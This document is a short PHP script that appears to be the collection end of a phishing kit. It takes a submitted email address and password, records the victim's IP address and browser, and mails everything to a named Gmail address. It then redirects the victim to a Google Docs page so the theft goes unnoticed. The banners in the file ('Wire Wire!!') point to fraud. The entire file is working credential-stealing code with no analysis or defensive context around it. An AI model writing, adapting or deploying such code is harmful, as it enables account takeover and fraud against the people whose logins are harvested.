<?php

$Email = $_POST['Email'];
$password = $_POST['password'];

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$message .= "************* Vsop Little Money *************\n";
$message .= "Email    : ".$Email."\n";
$message .= "Password   : ".$password."\n";
$message .= "IP Address : $ip\n";
$message .= "--------------------\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "***************Hhardharms***************\n";
$message .= "* Success is Loading... because I want it! Wire Wire!! *\n";

$send="sales.ghala.sa@gmail.com";



$subject = "$Email - IP: ".$ip."\n ";
$headers = "";
$str=array($send); foreach ($str as $send)
if(mail($send,$subject,$message,$headers) != false){

header("Location: https://docs.google.com/templates?type=spreadsheets&sort=hottest&view=public&authorId=08278030989184393556");
}

?>